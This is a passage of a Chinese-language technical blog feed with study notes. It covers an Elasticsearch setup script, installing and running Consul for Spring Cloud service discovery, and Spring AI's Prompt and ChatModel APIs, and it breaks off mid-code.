es-node3-http certs.zip http-certs.zip<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;分发证书完成&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># -------------------------------- 修改 ES 文件拥有者为 es ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始修改 ES 文件拥有者为 es&quot;</span><br><span class="hljs-built_in">chown</span> -R es:es /mystudy/es/elasticsearch<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;修改 ES 文件拥有者为 es 完成&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;本节点脚本执行结束&quot;</span><br></code></pre></td></tr></table></figure><hr><h2 id="查看-Ubuntu-版本"><a href="#查看-Ubuntu-版本" class="headerlink" title="查看 Ubuntu 版本"></a>查看 Ubuntu 版本</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">lsb_release -a<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">No LSB modules are available.</span><br><span class="hljs-string">Distributor ID: Ubuntu</span><br><span class="hljs-string">Description:    Ubuntu 24.04.2 LTS</span><br><span class="hljs-string">Release:        24.04</span><br><span class="hljs-string">Codename:       noble</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Spring Cloud</title>
    <link href="/2025/03/14/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Cloud/"/>
    <url>/2025/03/14/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Cloud/</url>
    
    <content type="html"><![CDATA[<h1 id="一、理论"><a href="#一、理论" class="headerlink" title="一、理论"></a>一、理论</h1><h3 id="1-导图：Map：Spring-Cloud"><a href="#1-导图：Map：Spring-Cloud" class="headerlink" title="1. 导图：Map：Spring Cloud"></a>1. 导图：<a href="../../maps/Map%EF%BC%9ASpringCloud.xmind">Map：Spring Cloud</a></h3><hr><h3 id="2-Spring-Cloud-组件图"><a href="#2-Spring-Cloud-组件图" class="headerlink" title="2. Spring Cloud 组件图"></a>2. Spring Cloud 组件图</h3><p><img src="/2025/03/14/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Cloud/image-20250427142937834.png"></p><hr><h3 id="3-Spring-Cloud-流程图"><a href="#3-Spring-Cloud-流程图" class="headerlink" title="3. Spring Cloud 流程图"></a>3. Spring Cloud 流程图</h3><ul><li>Spring Cloud LoadBalancer 是一种客户端负载均衡工具，用于在多个服务实例间分配请求。</li><li>OpenFeign 是一种声明式的 Web 服务客户端，简化 REST API 调用，可与 LoadBalancer 集成以实现负载均衡。</li><li>两者可配合使用：OpenFeign 定义客户端接口，LoadBalancer 处理请求分发。</li></ul><hr><h3 id="4-Consul"><a href="#4-Consul" class="headerlink" title="4. Consul"></a>4. Consul</h3><h4 id="4-1-Consul-概述"><a href="#4-1-Consul-概述" class="headerlink" title="4.1. Consul 概述"></a>4.1. Consul 概述</h4><p>&#x3D;&#x3D;1.现有问题&#x3D;&#x3D;<br>在微服务 A 调用微服务 B 的过程中，如果把 B 的 IP 和端口写死在 A 的代码里，就容易遇到一堆大麻烦：</p><ol><li><font color="#00b0f0">服务发现困难</font>：<ol><li>微服务 B 的 IP 或端口一旦变更，A 就懵了，找不到 B，调用失败。</li></ol></li><li><font color="#00b0f0">无法负载均衡</font>：<ol><li>系统里明明有好几个 B，A 却只能连固定的一个，导致这个 B 被打爆，其他 B 闲得发慌。</li></ol></li><li><font color="#00b0f0">服务健康状态未知</font>：<ol><li>B 已经“阵亡”了，A 还傻乎乎地发请求过去，结果超时、报错、出事故，谁也不好受。</li></ol></li></ol><p>即便我们可能有一些解决方案，例如 <code>Keepalived + Haproxy</code>，也还会存在一些问题：</p><ol><li><font color="#00b0f0">配置管理混乱</font>：<ol><li>服务多到飞起，每个服务都要配置一堆地址，配置文件满天飞，一改就头大，发布流程慢得像蜗牛。</li><li>有没有一种更清爽的方式？比如通用配置统一从一个固定位置拉取，大家只需要修改那个位置就行；而各服务的个性化配置则保留在各自的 <code>application.yml</code> 文件中，既集中管理，又保留灵活性。</li></ol></li><li><font color="#00b0f0">安全通信复杂</font>：<ol><li>服务间通信加密、证书管理，麻烦得让人怀疑人生。</li></ol></li></ol><p>&#x3D;&#x3D;2.Consul 解决方案&#x3D;&#x3D;<br>Consul 是 HashiCorp 家出品的一款神器，把<strong>服务发现</strong>、<strong>配置管理</strong>和<strong>服务网格</strong>统统打包到一起，靠着 HTTP API、DNS 和灵活的健康检查机制，轻松搞定上述痛点：</p><ol><li><font color="#00b0f0">服务发现困难？</font>：<ol><li>微服务一启动，就自己“报到”注册到 Consul，以后 A 直接问 Consul 要地址，妈妈再也不用担心我找不到 B！</li></ol></li><li><font color="#00b0f0">无法负载均衡？</font>：<ol><li>搭配 Gateway、OpenFeign、LoadBalancer 等组件，可以优雅实现负载均衡，自动把请求合理分发给多个 B。</li></ol></li><li><font color="#00b0f0">服务健康状态未知？</font>：<ol><li>Consul 自带健康探测机制，服务挂了就“踢出群聊”，服务要注册就“过来拜码头”</li></ol></li><li><font color="#00b0f0">配置管理混乱？</font>：<ol><li>配置集中托管在 Consul，微服务可以动态拉取或订阅更新，改配置就像改朋友圈状态一样轻松。</li></ol></li><li><font color="#00b0f0">安全通信复杂？</font>：<ol><li>Consul 内置证书颁发和管理，轻松搞定服务间的加密通信（Mutual TLS），安全又省心。</li></ol></li></ol><hr><h4 id="4-2-搭建-Consul-环境"><a href="#4-2-搭建-Consul-环境" class="headerlink" title="4.2. 搭建 Consul 环境"></a>4.2. 搭建 Consul 环境</h4><h5 id="4-2-1-高可用实现"><a href="#4-2-1-高可用实现" class="headerlink" title="4.2.1. 高可用实现"></a>4.2.1. 高可用实现</h5><h5 id="4-2-2-单体测试环境搭建"><a href="#4-2-2-单体测试环境搭建" class="headerlink" title="4.2.2. 单体测试环境搭建"></a>4.2.2. 单体测试环境搭建</h5><p>&#x3D;&#x3D;1.下载 Consul 安装包&#x3D;&#x3D;<br>从 <a href="https://developer.hashicorp.com/consul/install">Consul 下载地址</a> 下载 Consul 安装包：<br><img src="/2025/03/14/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Cloud/image-20250427165021312.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li>根据自己的 CPU 架构选择合适的下载方式</li><li>查看 CPU 架构：<code>uname -m</code></li></ol></blockquote><p>&#x3D;&#x3D;2.将 Consul 安装包上传到服务器并解压&#x3D;&#x3D;<br>在此步骤中，我将 Consul 安装包上传至 <code>/mystudy/consul</code> 目录，并直接在该目录中进行了解压。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 1. 进入目录</span><br><span class="hljs-attribute">cd</span> /mystudy/consul<br><br><br><span class="hljs-comment"># 2. 解压</span><br><span class="hljs-attribute">unzip</span> consul_1.<span class="hljs-number">20</span>.<span class="hljs-number">5</span>_linux_amd64.zip<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.启动 Consul&#x3D;&#x3D;</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 1. 前台启动</span><br>./consul agent <span class="hljs-punctuation">-</span>dev <span class="hljs-punctuation">-</span>client <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><br><br><br><span class="hljs-meta"># 2. 后台启动（把所有日志（标准输出 + 错误输出）都写到 consul.log 文件）</span><br><span class="hljs-meta"># 2.1. 后台启动 Consul</span><br>nohup ./consul agent <span class="hljs-punctuation">-</span>dev <span class="hljs-punctuation">-</span>client <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> &gt; consul.<span class="hljs-built_in">log</span> <span class="hljs-number">2</span>&gt;<span class="hljs-meta">&amp;1 &amp;</span><br><br><span class="hljs-meta"># 2.2. 查询是否正确启动</span><br>ps <span class="hljs-punctuation">-</span>ef <span class="hljs-string">| grep consul</span><br><br><br><span class="hljs-meta"># 2.3. 查询是否监听 8500</span><br>ss <span class="hljs-punctuation">-</span>lntp <span class="hljs-string">| grep 8500</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.访问 Consul UI&#x3D;&#x3D;</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//192.168.136.200:8500</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;5.补充：关闭 Consul&#x3D;&#x3D;</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 1. 查看 Consul 进程号</span><br><span class="hljs-attribute">ps</span> -ef | grep consul<br><br><br><span class="hljs-comment"># 2. 杀死 Consul</span><br><span class="hljs-attribute">kill</span> -<span class="hljs-number">9</span> <span class="hljs-number">641001</span><br></code></pre></td></tr></table></figure><hr><h5 id="4-2-3-高可用集群搭建（传统方案）"><a href="#4-2-3-高可用集群搭建（传统方案）" class="headerlink" title="4.2.3. 高可用集群搭建（传统方案）"></a>4.2.3. 高可用集群搭建（传统方案）</h5><hr><h5 id="4-2-4-高可用集群搭建（K8S，推荐）"><a href="#4-2-4-高可用集群搭建（K8S，推荐）" class="headerlink" title="4.2.4. 高可用集群搭建（K8S，推荐）"></a>4.2.4. 高可用集群搭建（K8S，推荐）</h5><hr><h4 id="4-3-使用-Spring-Cloud-Consul"><a href="#4-3-使用-Spring-Cloud-Consul" class="headerlink" title="4.3. 使用 Spring Cloud Consul"></a>4.3. 使用 Spring Cloud Consul</h4><h5 id="4-3-1-创建-Spring-Boot-Consul-项目"><a href="#4-3-1-创建-Spring-Boot-Consul-项目" class="headerlink" title="4.3.1. 创建 Spring Boot Consul 项目"></a>4.3.1. 创建 Spring Boot Consul 项目</h5><p>这里采用 IDEA 提供的脚手架创建 Spring Boot 项目，分别勾选：</p><ol><li>&#x3D;&#x3D;Web&#x3D;&#x3D;<ol><li>Spring Web</li></ol></li><li>&#x3D;&#x3D;Spring Cloud Config&#x3D;&#x3D;：<ol><li>Consul Configuration</li></ol></li><li>&#x3D;&#x3D;Spring Cloud Discovery&#x3D;&#x3D;<ol><li>Consul Discovery</li></ol></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li><font color="#00b0f0">Consul Configuration</font>：<ol><li>把应用的配置（比如数据库地址、密码、环境变量）存到 Consul，Spring Boot 启动时自动从 Consul 读配置，这样就不用放本地 <code>application.yml</code> 了</li></ol></li><li><font color="#00b0f0">Consul Discovery</font>：<ol><li>把你的服务注册到 Consul，让别人发现你，同时你也可以发现别人</li></ol></li></ol></blockquote><hr><h5 id="4-3-2-进行项目配置"><a href="#4-3-2-进行项目配置" class="headerlink" title="4.3.2. 进行项目配置"></a>4.3.2. 进行项目配置</h5><h6 id="4-3-2-1-Spring-Boot-如何加载配置文件"><a href="#4-3-2-1-Spring-Boot-如何加载配置文件" class="headerlink" title="4.3.2.1. Spring Boot 如何加载配置文件"></a>4.3.2.1. Spring Boot 如何加载配置文件</h6><p>在项目配置之前，我们必须了解 Spring Boot 如何加载配置文件，详情见：</p><hr><h6 id="4-3-2-2-创建配置文件"><a href="#4-3-2-2-创建配置文件" class="headerlink" title="4.3.2.2. 创建配置文件"></a>4.3.2.2. 创建配置文件</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span>  <br>  <span class="hljs-attr">application:</span>  <br>    <span class="hljs-attr">name:</span> <span class="hljs-string">first_test</span>                                <span class="hljs-comment"># 项目名称，一般也作为 Consul 注册的名称</span><br>  <span class="hljs-attr">cloud:</span>  <br>    <span class="hljs-attr">consul:</span>  <br>      <span class="hljs-attr">host:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.8</span>                           <span class="hljs-comment"># Consul 节点的 IP 地址</span><br>      <span class="hljs-attr">port:</span> <span class="hljs-number">8500</span>                                    <span class="hljs-comment"># Consul 节点的端口号</span><br>      <span class="hljs-attr">discovery:</span>  <br>        <span class="hljs-attr">service-name:</span> <span class="hljs-string">$&#123;spring.application.name&#125;</span>    <span class="hljs-comment"># 本服务在 Consul 注册的名称，一般与 application.name 一致</span><br>        <span class="hljs-attr">prefer-ip-address:</span> <span class="hljs-literal">true</span>                     <span class="hljs-comment"># 以本服务所在 IP 地址优先，否则会自动使用主机名</span><br>      <span class="hljs-attr">config:</span>  <br>        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">false</span>  <br></code></pre></td></tr></table></figure><p><img src="/2025/03/14/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Cloud/image-20250427192909664.png" alt="|475"></p><hr><h5 id="4-3-3-为主类标注-EnableDiscoveryClient"><a href="#4-3-3-为主类标注-EnableDiscoveryClient" class="headerlink" title="4.3.3. 为主类标注 @EnableDiscoveryClient"></a>4.3.3. 为主类标注 @EnableDiscoveryClient</h5><p><code>@EnableDiscoveryClient</code> 使得服务能够向注册中心（如 Eureka、Consul、Zookeeper 等）注册，并能够从注册中心发现其他服务。</p><p>当你启动这个 Spring Boot 应用时，它会自动将服务信息注册到 Consul 中，包括服务的名称、IP 地址和端口等。Consul 会维护这个服务的注册信息，其他服务可以通过 Consul 来发现该服务。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@SpringBootApplication</span>  <br><span class="hljs-variable">@EnableDiscoveryClient</span>  <br>public class CloudApplication &#123;  <br>  <br>    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">static</span> <span class="hljs-selector-tag">void</span> <span class="hljs-selector-tag">main</span>(String[] args) &#123;  <br>        <span class="hljs-selector-tag">SpringApplication</span><span class="hljs-selector-class">.run</span>(CloudApplication.class, args);  <br>    &#125;  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="LoadBalancer-OpenFeign"><a href="#LoadBalancer-OpenFeign" class="headerlink" title="LoadBalancer + OpenFeign"></a>LoadBalancer + OpenFeign</h3><h4 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h4><h5 id="创建并配置-OpenFeign-配置类"><a href="#创建并配置-OpenFeign-配置类" class="headerlink" title="创建并配置 OpenFeign 配置类"></a>创建并配置 OpenFeign 配置类</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h3 id="5-Spring-Cloud-LoadBalancer"><a href="#5-Spring-Cloud-LoadBalancer" class="headerlink" title="5. Spring Cloud LoadBalancer"></a>5. Spring Cloud LoadBalancer</h3><h4 id="5-1-Spring-Cloud-LoadBalancer-概述"><a href="#5-1-Spring-Cloud-LoadBalancer-概述" class="headerlink" title="5.1. Spring Cloud LoadBalancer 概述"></a>5.1. Spring Cloud LoadBalancer 概述</h4><ul><li>Spring Cloud LoadBalancer 是一种客户端负载均衡工具，用于在多个服务实例间分配请求。</li><li>OpenFeign 是一种声明式的 Web 服务客户端，简化 REST API 调用，可与 LoadBalancer 集成以实现负载均衡。</li><li>两者可配合使用：OpenFeign 定义客户端接口，LoadBalancer 处理请求分发。</li></ul><hr><h1 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h1><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h3 id="6-1-1-相关网站"><a href="#6-1-1-相关网站" class="headerlink" title="6.1.1. 相关网站"></a>6.1.1. 相关网站</h3><ol><li>&#x3D;&#x3D;Consul 官网&#x3D;&#x3D;：<ol><li><a href="https://developer.hashicorp.com/consul">https://developer.hashicorp.com/consul</a></li></ol></li><li>&#x3D;&#x3D;Consul 下载地址&#x3D;&#x3D;：<ol><li><a href="https://developer.hashicorp.com/consul/install">https://developer.hashicorp.com/consul/install</a></li></ol></li></ol><hr><h3 id="6-1-2-常见注册中心"><a href="#6-1-2-常见注册中心" class="headerlink" title="6.1.2. 常见注册中心"></a>6.1.2. 常见注册中心</h3><table><thead><tr><th>注册中心</th><th>开发语言</th><th>CAP 架构</th><th>对外暴露接口</th><th>是否支持服务健康检查</th><th>是否与 Spring Cloud 继承</th></tr></thead><tbody><tr><td><strong>Eureka</strong></td><td>Java</td><td>AP</td><td>可配置支持</td><td>HTTP</td><td>已集成</td></tr><tr><td><strong>Consul</strong></td><td>Go</td><td>CP</td><td>支持</td><td>HTTP&#x2F;DNS</td><td>已集成</td></tr><tr><td><strong>Zookeeper</strong></td><td>Java</td><td>CP</td><td>支持</td><td>客户端</td><td>已集成</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Spring 生态</category>
      
      <category>Spring Cloud</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Spring AI</title>
    <link href="/2025/03/12/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20AI/"/>
    <url>/2025/03/12/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20AI/</url>
    
    <content type="html"><![CDATA[<h1 id="一、理论"><a href="#一、理论" class="headerlink" title="一、理论"></a>一、理论</h1><h3 id="0、导图：Map：Spring-AI"><a href="#0、导图：Map：Spring-AI" class="headerlink" title="0、导图：Map：Spring AI"></a>0、导图：<a href="../../maps/Map%EF%BC%9ASpringAI.xmind">Map：Spring AI</a></h3><hr><h3 id="1、Spring-AI-概述"><a href="#1、Spring-AI-概述" class="headerlink" title="1、Spring AI 概述"></a>1、Spring AI 概述</h3><p>Spring AI 是一个旨在简化 Java 开发者集成 AI 功能的框架，其<strong>提供统一的 API 接口</strong>，便于调用多种 AI 模型。它支持对话生成、文本生成、向量化处理、多模态交互等功能。</p><hr><h3 id="2、核心模型-API"><a href="#2、核心模型-API" class="headerlink" title="2、核心模型 API"></a>2、核心模型 API</h3><h4 id="2-1、前言：了解-Prompt"><a href="#2-1、前言：了解-Prompt" class="headerlink" title="2.1、前言：了解 Prompt"></a>2.1、前言：了解 Prompt</h4><p><code>Prompt</code> 封装了一系列消息（<code>Message</code>），包括<strong>角色定义</strong>、<strong>用户指令</strong>和<strong>约束条件</strong>，并允许设置<strong>模型参数</strong>。通过这种方式，我们可以将 Prompt 以参数的形式传递给大模型，从而精确控制对话上下文，并有效引导 AI 模型生成预期的响应。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* Prompt 的构造方法：</span><br><span class="hljs-comment">* </span><br><span class="hljs-comment">* 1. Prompt(String)</span><br><span class="hljs-comment">* 2. Prompt(Message)</span><br><span class="hljs-comment">* 3. Prompt(List&lt;Message&gt;)</span><br><span class="hljs-comment">* 4. Prompt(String,ChatOptions)</span><br><span class="hljs-comment">* 5. Prompt(Message,ChatOptions)</span><br><span class="hljs-comment">* 6. Prompt(List&lt;Message&gt;,ChatOptions)</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 以 Prompt(List&lt;Message&gt;,ChatOptions)为例：</span><br><br><span class="hljs-comment">// 1. 配置模型参数</span><br>ChatOptions chatOptions = ChatOptionsBuilder.builder()  <br>.withModel(<span class="hljs-string">&quot;qwen-max-latest&quot;</span>)  <br>.withTemperature(<span class="hljs-number">0.7</span>)  <br>.build();  <br><br><span class="hljs-comment">// 2. 定义消息序列</span><br>List&lt;Message&gt; messages = <span class="hljs-keyword">new</span> ArrayList&lt;Message&gt;();  <br>messages.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> SystemMessage(<span class="hljs-string">&quot;你是一位资深Java架构师&quot;</span>)); <span class="hljs-comment">// 角色定义，设定模型的角色和背景，例如：你是一位 Java 架构师</span><br>messages.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> UserMessage(message)); <span class="hljs-comment">// 用户指令，传达具体的任务或需求，例如：请设计一个高并发订单系统</span><br>messages.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> AssistantMessage(<span class="hljs-string">&quot;输出需包含架构图和核心代码&quot;</span>)); <span class="hljs-comment">// 用户指令，传达具体的任务或需求，例如：请设计一个高并发订单系统</span><br><br><span class="hljs-comment">// 3.将消息序列和模型参数封装为 prompt</span><br>Prompt prompt = <span class="hljs-keyword">new</span> Prompt(messages,chatOptions);  <br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>消息序列通常并非硬编码在程序中，而是通过动态注入的方式生成，以便根据不同的需求灵活调整对话内容和模型响应</li></ol></blockquote><hr><h4 id="2-2、对话模型-API"><a href="#2-2、对话模型-API" class="headerlink" title="2.2、对话模型 API"></a>2.2、对话模型 API</h4><h5 id="2-2-1、ChatModel"><a href="#2-2-1、ChatModel" class="headerlink" title="2.2.1、ChatModel"></a>2.2.1、ChatModel</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* chatModel 的 call 方法：</span><br><span class="hljs-comment">* </span><br><span class="hljs-comment">* 1. call(Prompt prompt)：该方法接受一个封装了消息序列的 Prompt 对象，并允许配置模型参数，适用于需要复杂对话管理的场景，例如多轮对话、角色扮演，或对AI模型行为的细致调控。</span><br><span class="hljs-comment">* 2. call(String message)：最简化的调用方式，直接传入一条字符串作为用户的提问。内部会自动将该字符串转为包含单一用户消息的 Prompt 对象并发送给AI模型。适合基础的交互需求，例如简单的问答功能，且无需处理复杂的对话逻辑或个性化设置。</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">@RestController</span>  <br><span class="hljs-meta">@RequestMapping(&quot;/ai&quot;)</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChatModelTest</span> &#123;  <br><span class="hljs-comment">// 1. 注入 ChatModel</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ChatModel chatModel;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ChatModelTest</span><span class="hljs-params">(ChatModel chatModel)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.chatModel = chatModel;  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@GetMapping(&quot;/chatModel&quot;)</span>  <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">chat</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String question)</span> &#123;  <br>    <span class="hljs-comment">// 配置模型参数</span><br>        <span class="hljs-type">ChatOptions</span> <span class="hljs-variable">chatOptions</span> <span class="hljs-operator">=</span> ChatOptionsBuilder.builder()  <br>                .withModel(<span class="hljs-string">&quot;qwen-max-latest&quot;</span>)  <br>                .withTemperature(<span class="hljs-number">0.7</span>)  <br>                .build();  <br>                <br><span class="hljs-comment">// 定义消息序列</span><br>        List&lt;Message&gt; messages = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Message&gt;();  <br>        messages.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SystemMessage</span>(<span class="hljs-string">&quot;你是一位资深Java架构师&quot;</span>)); <span class="hljs-comment">// 角色定义  </span><br>        messages.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">UserMessage</span>(question)); <span class="hljs-comment">// 用户指令，例如：请设计一个高并发订单系统  </span><br>        messages.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AssistantMessage</span>(<span class="hljs-string">&quot;输出需包含架构图和核心代码&quot;</span>)); <span class="hljs-comment">// 约束条件  </span><br>        <br><span class="hljs-comment">// 2.将消息序列和模型参数封装为 prompt</span><br>        <span class="hljs-type">Prompt</span> <span class="hljs-variable">prompt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Prompt</span>(messages,chatOptions);  <br>        <br>        <span class="hljs-comment">// 3. 调用 chatModel 的 call 方法，并对返回结果进行处理</span><br>        <span class="hljs-type">ChatResponse</span> <span class="hljs-variable">chatResponse</span> <span class="hljs-operator">=</span> chatModel.call(prompt);  <br>        <span class="hljs-keyword">return</span> chatResponse.getResult().getOutput().getContent();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>ChatModel</code> 来自 <code>org.springframework.ai.chat.model</code> </li><li><code>ChatOptionsBuilder</code> 来自 <code>org.springframework.ai.chat.prompt</code></li><li><code>Message</code> 来自 <code>org.springframework.ai.chat.messages</code></li></ol></blockquote><hr><h5 id="2-2-2、StreamingChatModel"><a href="#2-2-2、StreamingChatModel" class="headerlink" title="2.2.2、StreamingChatModel"></a>2.2.2、StreamingChatModel</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* StreamingChatModel 的 stream 方法：</span><br><span class="hljs-comment">* </span><br><span class="hljs-comment">* 1. stream(Prompt prompt)：该方法接受一个封装了消息序列的 Prompt 对象，并允许配置模型参数，适用于需要复杂对话管理的场景，例如多轮对话、角色扮演，或对AI模型行为的细致调控。</span><br><span class="hljs-comment">* 2. stream(String message)：最简化的调用方式，直接传入一条字符串作为用户的提问。内部会自动将该字符串转为包含单一用户消息的 Prompt 对象并发送给AI模型。适合基础的交互需求，例如简单的问答功能，且无需处理复杂的对话逻辑或个性化设置。</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">@RestController</span>  <br><span class="hljs-meta">@RequestMapping(&quot;/ai&quot;)</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StreamingChatModelTest</span> &#123;  <br>    <span class="hljs-comment">// 1. 注入 StreamingChatModel    </span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> StreamingChatModel streamingChatModel;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">StreamingChatModelTest</span><span 